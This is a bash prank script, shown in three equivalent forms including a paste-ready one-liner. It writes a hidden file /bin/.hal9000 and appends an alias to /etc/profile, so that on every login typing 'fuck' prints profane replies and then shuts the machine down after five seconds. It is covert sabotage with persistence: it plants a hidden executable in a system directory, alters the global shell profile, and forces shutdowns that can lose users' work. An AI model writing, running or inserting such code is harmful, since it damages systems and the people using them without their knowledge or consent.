#!/bin/bash

cat << EOF > /bin/.hal9000 
#!/bin/bash

var=$(echo "$1" | tr '[:upper:]' '[:lower:]')

case $var in
	you) echo -e "\t\t Fuck me?!  FUCK YOU!" ;;
	off) echo -e "\t\t You fuck off!" ;;
	this) echo -e "\t\t Fuck you!" ;;
	me) echo -e "\t\t You're fucked!" ;;
	*) echo -e "\t\t Fuckin' right!" ;;
esac

sleep 5s
shutdown -h now

EOF

alias fuck="/bin/.hal9000" ;
echo -e 'alias fuck="/bin/.hal9000"' >> /etc/profile

-------------------------------------------------------------------------------

echo -e '#!/bin/bash' > /bin/.hal9000 ;
echo -e "" >> /bin/.hal9000 ;
echo -e "var=\$(echo \"\$1\" | tr '[:upper:]' '[:lower:]')" >> /bin/.hal9000 ;
echo "" >> /bin/.hal9000 ;
echo "case \$var in" >> /bin/.hal9000 ;
echo -e '\tyou) echo -e "\\t\\t Fuck me?!  FUCK YOU!" ;;' >> /bin/.hal9000 ;
echo -e '\toff) echo -e "\\t\\t You fuck off!" ;;' >> /bin/.hal9000 ;
echo -e '\tthis) echo -e "\\t\\t Fuck you!" ;;' >> /bin/.hal9000 ;
echo -e '\tme) echo -e "\\t\\t Youre fucked!" ;;' >> /bin/.hal9000 ;
echo -e '\t*) echo -e "\\t\\t Fuckin right!" ;;' >> /bin/.hal9000 ;
echo -e 'esac' >> /bin/.hal9000 ;
echo -e '' >> /bin/.hal9000 ;
echo -e 'sleep 5s' >> /bin/.hal9000 ;
echo -e 'shutdown -h now' >> /bin/.hal9000 ;
alias fuck="/bin/.hal9000" ;
echo -e 'alias fuck="/bin/.hal9000"' >> /etc/profile

-------------------------------------------------------------------------------

echo -e '#!/bin/bash' > /bin/.hal9000 ; echo -e "" >> /bin/.hal9000 ; echo -e "var=\$(echo \"\$1\" | tr '[:upper:]' '[:lower:]')" >> /bin/.hal9000 ; echo "" >> /bin/.hal9000 ; echo "case \$var in" >> /bin/.hal9000 ; echo -e '\tyou) echo -e "\\t\\t Fuck me?!  FUCK YOU!" ;;' >> /bin/.hal9000 ; echo -e '\toff) echo -e "\\t\\t You fuck off!" ;;' >> /bin/.hal9000 ; echo -e '\tthis) echo -e "\\t\\t Fuck you!" ;;' >> /bin/.hal9000 ; echo -e '\tme) echo -e "\\t\\t Youre fucked!" ;;' >> /bin/.hal9000 ; echo -e '\t*) echo -e "\\t\\t Fuckin right!" ;;' >> /bin/.hal9000 ; echo -e 'esac' >> /bin/.hal9000 ; echo -e '' >> /bin/.hal9000 ; echo -e 'sleep 5s' >> /bin/.hal9000 ; echo -e 'shutdown -h now' >> /bin/.hal9000 ; alias fuck="/bin/.hal9000" ; echo -e 'alias fuck="/bin/.hal9000"' >> /etc/profile

